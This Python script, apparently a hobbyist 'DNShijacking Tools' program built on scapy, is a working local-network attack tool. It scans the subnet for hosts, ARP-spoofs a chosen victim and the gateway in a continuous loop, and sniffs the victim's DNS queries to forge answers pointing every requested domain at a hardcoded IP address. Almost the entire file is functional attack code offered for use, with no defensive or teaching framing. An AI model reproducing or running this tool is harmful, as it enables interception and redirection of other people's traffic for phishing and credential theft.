# -*- coding: utf-8 -*-
"""
Created on Tue Mar 19 19:28:56 2019

@author: Administrator
"""

from scapy.all import *  #a sniffing module
from threading import *
import sys
import netifaces
import psutil


def get_netcard(ipAddress):  #obtain the name of netcard
    info = psutil.net_if_addrs()
    for k, v in info.items():
        for item in v:
            if item[0] == 2 and item[1] == ipAddress:
                return k

def get_IP():   #obtain my IP
    routingNicName = netifaces.gateways()['default'][netifaces.AF_INET][1]   #Network apdater name
    for interface in netifaces.interfaces():
        if interface == routingNicName:
            try:
                IPaddr = netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['addr']   
            except KeyError:
                pass
    return IPaddr
           
def scan_active_host():
    gateway = gatewayip = netifaces.gateways()['default'][netifaces.AF_INET][0]
    IPscan = gateway + "/24" #subnet mask
    try:
        answer, unanswer = srp(Ether(dst="FF:FF:FF:FF:FF:FF")/ARP(pdst=IPscan), timeout=2) #srp() send and recieve packets in layer 3, return 2 lists including answer and unanswer
    except Exception as e:
        print(e)
    else:
        for send, rcv in answer:
            ListMACAddr = rcv.sprintf("%Ether.src%---%ARP.psrc%")
            print(ListMACAddr)

def ARPspoof(interface,tip,gip):
    localmac = get_if_hwaddr(interface) #get my MAC address
    tmac = getmacbyip(tip) #get the victim host MAC address
    gmac = getmacbyip(gip) #get the victim gateway MAC address
    own_ip = get_IP() #get my IP

    targat_arp_response = Ether(src = localmac,dst = tmac)/ARP(hwsrc=localmac,psrc=gip,hwdst=tmac,pdst=tip,op=2) #forge a response ARP packet to victim host
    gateway_arp_response = Ether(src = localmac,dst = gmac)/ARP(hwsrc=localmac,psrc=tip,hwdst=gmac,pdst=gip,op=2) #forge a response ARP packet to victim gateway
    own_arp_response = Ether(src = gmac, dst = localmac)/ARP(hwsrc=gmac,psrc=gatewayip,hwdst=localmac,pdst=own_ip,op=2) #correct my own ARP
    try:
        while 1:
            sendp(targat_arp_response,inter = 2,iface = interface)  #send but not recieve in layer 2
            sendp(gateway_arp_response,inter = 2,iface = interface)
            sendp(own_arp_response,inter = 2,iface = interface)
    except KeyboardInterrupt:
        sys.exit(0)

def send_response(p,victim_ip,trick_ip):  #build response packets by copying a request packet
    if p.haslayer(IP):
        if p[IP].src != victim_ip: #avoid mistake hijack others
            return
    req_domain = p[DNS].qd.qname #obtain the requested domain
    print ('Found request for ' + req_domain.decode() +' from ' + victim_ip)
    #Delete the existing lengths and checksums..
    del(p[UDP].len)    
    del(p[UDP].chksum)
    if p.haslayer(IPv6):
        del(p[IPv6].len)
        del(p[IPv6].chksum)
    elif p.haslayer(IP):
        del(p[IP].len)
        del(p[IP].chksum)

    response = p.copy() #copy the request packet then re-write it
    response.FCfield = 2
    #Switch request packet into response packet
    
    # Switch the MAC addresses
    response.src,response.dst= p.dst,p.src 
    # Switch the IP addresses
    if p.haslayer(IP):
        response[IP].src,response[IP].dst = p[IP].dst,p[IP].src
    elif p.haslayer(IPv6):
        response[IPv6].src,response[IPv6].dst = p[IPv6].dst,p[IPv6].src
    # Switch the ports
    response.sport,response.dport= p.dport,p.sport
    # Set the DNS flags
    response[DNS].qr = 1
    response[DNS].ra = 1
    response[DNS].ancount = 1
    response[DNS].an = DNSRR(  #add a section for answer
        rrname = req_domain,
        type = 'A',
        rclass = 'IN',
        ttl = 900,
        rdata = trick_ip
        )
    gip = netifaces.gateways()['default'][netifaces.AF_INET][0]
    gmac = getmacbyip(gip)
    tmac = getmacbyip(victim_ip)
    rebuild_correct_connection = Ether(src = gmac,dst = tmac)/ARP(hwsrc=gmac,psrc=gip,hwdst=tmac,pdst=victim_ip,op=2) #diao!!
    try:
        sendp(response)
        sendp(rebuild_correct_connection) #make the victim host connect to correct gateway, in order to jump to the trick ip
    except KeyboardInterrupt:
        sys.exit(0)
        
    print (victim_ip+'--Relocate ' + req_domain.decode() + ' -> ' + trick_ip + '\n')

def DNShijack(victim_ip,trick_ip):  #sniff requests packets then excute dnshijacking
    myip = get_IP()
    conf.iface = get_netcard(myip)
    sniff(prn=lambda p: send_response(p,victim_ip,trick_ip), filter='udp dst port 53')
    
if __name__=='__main__':
    start = """
DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
NNNNN                                   NNNNN
SSSSS      DNShijacking Tools           SSSSS
HHHHH                                   HHHHH
IIIII      [1]:scan active hosts        IIIII
JJJJJ      [2]:hijacking a host         JJJJJ
AAAAA      [0]:quit                     AAAAA
CCCCC                                   CCCCC
KKKKK                    Version: 2.0   KKKKK
IIIII                    by: desiigner  IIIII
NNNNN                                   NNNNN
GGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGG
"""
    gatewayip = netifaces.gateways()['default'][netifaces.AF_INET][0]  #obtain gateway IP
    myip = get_IP()   #obtain my IP
    interface = get_netcard(myip)   #obtain netcard name
    trick_ip = '193.112.56.237' #jump IP 

    print (start)
    while 1:
        options = input(">options: ")
        if options == '1':
            scan_active_host()
        if options == '2':
            victim_ip = input(">Taget host IP: ")
            thread_arp = Thread(target=ARPspoof,args=(interface,victim_ip,gatewayip,))
            thread_dns = Thread(target=DNShijack,args=(victim_ip,trick_ip,))
            thread_arp.start()
            thread_dns.start()
            thread_arp.join()
            thread_dns.join()
        if options == '0':
            break
